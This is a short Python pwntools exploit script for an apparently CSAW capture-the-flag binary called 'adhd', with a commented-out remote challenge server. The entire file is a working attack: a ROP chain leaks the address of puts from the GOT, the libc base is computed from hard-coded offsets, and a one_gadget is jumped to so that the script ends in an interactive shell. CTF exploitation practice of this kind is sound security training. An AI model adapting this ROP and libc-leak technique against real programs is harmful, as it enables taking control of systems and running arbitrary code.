#!/usr/bin/env python

from pwn import *
import binascii

#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
r = process("./adhd")#, env=env)
gdb.attach(r, '''
	set disable-randomization off
	b main
	b *0x40060d
	c
	''')
# r = remote("pwn.chal.csaw.io",10102)

r.recvuntil("Give give:\n")

payload = ''
payload += p64(0x4006a3) # pop rdi; ret
payload += p64(0x600fd8) # puts@GOT
payload += p64(0x4005f2) # puts() in main

r.send(payload)

leak = u64(r.recvline().strip() + '\x00\x00') # leak is address of puts
print "leak: ", hex(leak)

BASE =  leak - 0x6f690 # thanks libc-database
one_gadget = BASE + 0x45216

# one_gadget = leak + 0x45216

print "one_gadget location:", hex(one_gadget)

payload = p64(0x4005f2)
payload += p64(0x4005f7)
payload += p64(one_gadget) #jumps to this location!
# payload += "/bin/sh"
payload += p64(0x4006a3)
# payload += p64(0x4006a3)
r.send(payload)

r.interactive()